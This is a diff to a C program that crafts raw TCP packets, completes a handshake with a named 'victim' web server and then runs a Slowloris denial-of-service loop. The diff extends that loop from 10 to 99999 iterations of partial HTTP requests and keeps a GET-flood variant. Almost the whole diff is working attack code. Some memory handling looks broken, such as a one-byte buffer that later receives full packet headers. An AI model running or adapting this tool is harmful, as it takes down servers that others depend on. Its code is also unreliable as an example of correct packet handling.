@@ -1,11 +1,99 @@
 #include "handshake.h"
 
-int start_sniffing(char *argv[])
+int send_syn(int sock_raw, char *source_ip, struct in_addr dst_ip, u_int16_t *source_port, char *argv[])
+{
+//IP header
+    struct ip iph;
+    struct tcphdr tcph;
+    struct sockaddr_in dest;
+
+    char *packet_to_send;
+    packet_to_send = (char *)malloc(60);
+    if(packet_to_send == NULL)
+    {
+        perror("Could not allocate packet_to_send mem on heap.\n");
+        exit(-1);
+    }
+    //Zero out the packet memory area
+    //memset(packet_to_send, 0, 4096);
+    //Fill in the IP header
+    iph.ip_hl = 5;
+    iph.ip_v = 4;
+    iph.ip_tos = 0;
+    iph.ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
+    iph.ip_id = htons(12345);
+    iph.ip_off = 0;
+    iph.ip_ttl = 64;
+    iph.ip_p = IPPROTO_TCP;
+    iph.ip_sum = 0; //Will be calculated afterwards
+    iph.ip_src.s_addr = inet_addr(source_ip);
+    iph.ip_dst.s_addr = dst_ip.s_addr;
+
+    //Function that calculates checksum is implemented in trafgen
+    iph.ip_sum = csum((unsigned short *) packet_to_send, iph.ip_len >> 1);
+
+    memcpy(packet_to_send, &iph, sizeof(iph));
+
+    //Fill in the TCP header
+    tcph.th_sport = htons(*source_port);
+    tcph.th_dport = htons(80);
+    tcph.th_seq = htonl(0);
+    tcph.th_ack = htonl(0);
+    tcph.th_x2 = 0;
+    tcph.th_off = sizeof(struct tcphdr) / 4;
+    tcph.th_flags = TH_SYN;
+    tcph.th_win = htons(29200);
+    tcph.th_sum = 0;
+    tcph.th_urp = 0;
+    tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));
+
+    memcpy((packet_to_send + sizeof(iph)), &tcph, sizeof(tcph));
+
+    int one = 1;
+
+    //IP_HDRINCL tells the kernel that headers are included
+    if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
+    {
+        fprintf(stderr, "Error setting up setsockopt!\n");
+        return 1;
+    }
+
+    printf("Starting sniffing.\n");
+    pthread_t thread1;
+
+    //Creating thread with start_sniffing() function call, will start receiving packets and process them
+    if(pthread_create(&thread1, NULL, (void *)start_sniffing, argv) < 0)
+    {
+        fprintf(stderr, "Failed to create a new thread.\n");
+        return 1;
+    }
+    sleep(1);
+
+    printf("Starting to send packets.\n");
+
+    //dest - sockaddr_in
+    memset(&dest, 0, sizeof(dest));
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = iph.ip_dst.s_addr;
+
+    //Send the packet out
+    if(sendto(sock_raw, packet_to_send, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
+    {
+        fprintf(stderr, "Error sending syn packet! Error message: %s\n", strerror(errno));
+        exit(1);
+    }
+    free(packet_to_send);
+    return 0;
+}
+
+void start_sniffing(char *argv[])
 {
     pcap_t *descr;
     char filter[30];
     sprintf(filter, "host %s and port 80", argv[1]);
-    char *dev = "wlan0";
+    char *dev;
+    //"eth0/wlan0" using as a device I will be sniffing on
+    dev = argv[3];
     char error_buffer[PCAP_ERRBUF_SIZE];
 
     bpf_u_int32 net;
@@ -13,15 +101,16 @@ int start_sniffing(char *argv[])
 
     struct bpf_program filterf;
 
+    printf("Your pcap filter: %s\n", filter);
+    printf("Opening live pcap device: %s. \n", dev);
     if((descr = pcap_open_live(dev, BUFSIZ, 1, -1, error_buffer)) == NULL)
     {
         perror("Could not open a pcap device.\n");
-        return 1;
+        exit(1);
     }
 
     //looking up net/mask for given dev
     pcap_lookupnet(dev, &net, &mask, error_buffer);
-
     //compiling filter expression
     pcap_compile(descr, &filterf, filter, 0, net);
 
@@ -29,7 +118,7 @@ int start_sniffing(char *argv[])
     if(pcap_setfilter(descr, &filterf) == -1)
     {
         perror("Error setting up pcap filter.\n");
-        return 1;
+        exit(1);
     }
 
     //freeing a bpf program
@@ -46,10 +135,12 @@ int start_sniffing(char *argv[])
         if(pcap_loop(descr, -1, (void *) packet_receive, (u_char *) argv) < 0)
         {
             perror("Cannot get raw packet.\n");
-            return 1;
+            exit(1);
         }
 
-    return 0;
+    //pcap_close(descr);
+
+    exit(0);
 }
 
 void packet_receive(u_char *argv[], const struct pcap_pkthdr *pkthdr, const u_char *packet)
@@ -88,12 +179,13 @@ void packet_receive(u_char *argv[], const struct pcap_pkthdr *pkthdr, const u_ch
     if((tcp->th_flags & TH_SYN) && (tcp->th_flags & TH_ACK) && !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
     {
         u_int32_t seq_n = ntohl(tcp->th_seq);
+        u_int32_t ack_n = ntohl(tcp->th_ack);
         //printf("Sequence num is: %u\n", seq_n);
-        send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, argv);
+        send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, argv);
     }
 }
 
-void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_char *argv[])
+void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
 {
     struct ip iph;
     struct tcphdr tcph;
@@ -105,6 +197,12 @@ void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, 
 
     char *pkt_syn_ack;
     pkt_syn_ack = (char *) malloc(60);
+    if(pkt_syn_ack == NULL)
+    {
+        perror("Could not allocate pkt_syn_ack mem on heap.\n");
+        exit(-1);
+    }
+
 
     iph.ip_hl = 5;
     iph.ip_v = 4;
@@ -124,7 +222,7 @@ void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, 
 
     tcph.th_sport = htons(source_port);
     tcph.th_dport = htons(80);
-    tcph.th_seq = htonl(1);
+    tcph.th_seq = htonl(ack);
     tcph.th_ack = htonl(seq + 1);
     tcph.th_x2 = 0;
     tcph.th_off = sizeof(struct tcphdr) / 4;
@@ -155,6 +253,7 @@ void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, 
         exit(1);
     }
 
+    free(pkt_syn_ack);
     slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
     //get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
 }
@@ -168,9 +267,21 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     printf("Victim: %s\n", argv[1]);
     char *pkt_data;
     pkt_data = (char *) malloc(60);
+    if(pkt_data == NULL)
+    {
+        perror("Could not allocate pkt_data mem on heap.\n");
+        exit(-1);
+    }
+
 
     uint8_t *packet;
     packet = malloc(sizeof(u_int8_t));
+    if(packet == NULL)
+    {
+        perror("Could not allocate packet mem on heap.\n");
+        exit(-1);
+    }
+
 
     sprintf(pkt_data, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n", argv[2], argv[1]);
 
@@ -190,7 +301,7 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);
 
     memcpy(packet, &iph, sizeof(iph));
-    printf("TCP segments length: %u", pkt_data_len);
+    printf("TCP segments length: %u\n", pkt_data_len);
 
     tcph.th_sport = htons(source_port);
     tcph.th_dport = htons(80);
@@ -224,7 +335,7 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
 
     u_int32_t pkt_data_len2 = strlen(pkt_data);
 
-    for(int i = 0; i < 10; i++)
+    for(int i = 0; i < 99999; i++)
     {
         iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len2);
         iph.ip_id = htons(12348);
@@ -247,7 +358,7 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
         memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data, pkt_data_len2 * sizeof(u_int8_t));
 
         sleep(10);
-
+        printf("Sending Keep-Alive packet.\n");
         if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len2, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
         {
             perror("Failed to send keepalive packet!\n");
@@ -256,6 +367,9 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
         sleep(10);
 
     }
+    free(pkt_data);
+    free(packet);
+    pthread_exit(0);
 
 }
 
@@ -268,9 +382,21 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     printf("Victim: %s\n", argv[1]);
     char *pkt_data;
     pkt_data = (char *) malloc(60);
+    if(pkt_data == NULL)
+    {
+        perror("Could not allocate pkt_data mem on heap.\n");
+        exit(-1);
+    }
+
 
     uint8_t *packet;
     packet = malloc(sizeof(u_int8_t));
+    if(packet == NULL)
+    {
+        perror("Could not allocate packet mem on heap.\n");
+        exit(-1);
+    }
+
 
     sprintf(pkt_data, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", argv[2], argv[1]);
 
@@ -321,6 +447,8 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
         }
         sleep(5);
     }
+    free(pkt_data);
+    free(packet);
 
 }
 
